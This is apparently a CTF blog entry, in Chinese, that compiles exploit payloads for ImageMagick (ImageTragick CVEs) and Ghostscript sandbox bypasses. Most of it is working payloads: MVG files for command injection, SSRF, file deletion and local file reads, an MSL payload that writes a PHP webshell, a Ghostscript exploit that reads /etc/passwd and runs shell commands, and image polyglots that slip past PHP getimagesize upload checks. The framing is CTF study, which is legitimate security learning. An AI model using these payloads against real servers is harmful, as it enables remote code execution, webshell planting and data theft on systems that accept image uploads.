    <content type="html"><![CDATA[<h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h1><ul><li><h2 id="Bypass-code"><a href="#Bypass-code" class="headerlink" title="Bypass code"></a>Bypass code</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $_FILES[&#39;image&#39;][&#39;tmp_name&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$size &#x3D; getimagesize($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">if ($size &amp;&amp; $size[0] &gt; 100 &amp;&amp; $size[1] &gt; 100) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $img &#x3D; new Imagick($_FILES[&#39;image&#39;][&#39;tmp_name&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;cropThumbnailImage(100, 100);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;writeImage(&#39;newimage.gif&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h3 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h3><ul><li><p>ImageMagick 6.9.3-9 </p></li><li><h3 id="CVE-2016-3714"><a href="#CVE-2016-3714" class="headerlink" title="CVE-2016-3714"></a>CVE-2016-3714</h3><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p><p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的。</p><p>调用的漏洞委托：</p><p><code>&lt;delegate decode=&quot;https&quot; command=&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;/&gt;</code></p><p>漏洞poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|id;&quot;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h3><p> 利用mvg格式中可以包含url的特点，进行SSRF攻击 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(http:&#x2F;&#x2F;example.com&#x2F;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h3><p> 利用ImageMagick支持的ephemeral协议，来删除任意文件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;ephemeral:&#x2F;tmp&#x2F;delete.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h3><p> ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell </p><p> 特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">file_move.mvg</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;msl:&#x2F;tmp&#x2F;msl.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;msl.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&lt;image&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&lt;read filename&#x3D;&quot;&#x2F;tmp&#x2F;image.gif&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&lt;write filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;shell.php&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;image&gt;</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h3><p> 造成本地文件读取漏洞： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;label:@&#x2F;etc&#x2F;hosts&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="Pocs"><a href="#Pocs" class="headerlink" title="Pocs"></a>Pocs</h3><p><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">Pocs</a></p></li></ul></li></ul><ul><li><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><ul><li><p>漏洞代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  new Imagick(&#39;vul.gif&#39;);</span></pre></td></tr></table></figure><p>无返回值，需从日志读取</p></li><li><h3 id="ImageMagick内存泄漏漏洞（CVE-2018-16323）"><a href="#ImageMagick内存泄漏漏洞（CVE-2018-16323）" class="headerlink" title="ImageMagick内存泄漏漏洞（CVE-2018-16323）"></a>ImageMagick内存泄漏漏洞（CVE-2018-16323）</h3></li><li><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li><p>生成PoC（ps文件）；</p></li><li><p>上传即可</p></li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) currentdevice putdeviceprops</span></pre></td></tr></table></figure></li><li><h3 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h3></li></ul></li></ul><ul><li><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>生成poc</li><li>上传即可</li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;exploit &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    (Stage 11: Exploitation...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#x2F;forceput exch def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;SAFER false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    userparams &#x2F;LockFilePermissions false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    % update</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    save restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    % All done.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    stop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&#125; def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">errordict &#x2F;typecheck &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount typecount 1 add def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    % The first error will be the .knownget, which we handle and setup the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">    % dump the operands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">    typecount 1 eq &#123; null &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">&#125; put</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">% marked as executeonly or pseudo-operators.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">% fail because when the routine was declared, it used &#96;bind&#96; but many of the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">% works.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">&lt;&lt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount      0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">        % cause a &#x2F;typecheck error we handle above</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">% Demonstrate reading a file we shouldnt have access to.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">(Attempting to execute a shell command...)&#x3D; flush</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">% run command</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success) (w) file closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">(All done.)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">quit</span></pre></td></tr></table></figure></li></ul><ul><li><h2 id="绕过getimagesize，执行new-ImageMagick-漏洞"><a href="#绕过getimagesize，执行new-ImageMagick-漏洞" class="headerlink" title="绕过getimagesize，执行new ImageMagick()漏洞"></a>绕过getimagesize，执行new ImageMagick()漏洞</h2><ul><li><h3 id="mvg格式的POC-："><a href="#mvg格式的POC-：" class="headerlink" title="mvg格式的POC ："></a>mvg格式的POC ：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|&quot;&#96;id&#96;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">#define xlogo_width 200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">#define xlogo_height 200</span></pre></td></tr></table></figure><ul><li><p>xbm图片是一个文本格式的文件，而不像其他图片一样是二进制文件。如果某一行格式满足</p><p><code>#define %s %d</code>，那么取出其中的字符串和数字，再从字符串中取出<code>width</code>或<code>height</code>，将数字作为图片的长和宽。</p></li><li><p>后面两句，使其正常判断mvg格式文件的大小</p></li></ul></li><li><h4 id="ps文件poc"><a href="#ps文件poc" class="headerlink" title="ps文件poc"></a>ps文件poc</h4><ul><li><p>借助CVE-2018-16509的POC </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">__________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id) currentdevice putdeviceprops</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#x2F;test &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_width 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_height 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      在ctf的图片操作中，利用此模块代码的漏洞进行绕过。
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="绕过" scheme="http://h3art3ars.github.io/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
</feed>
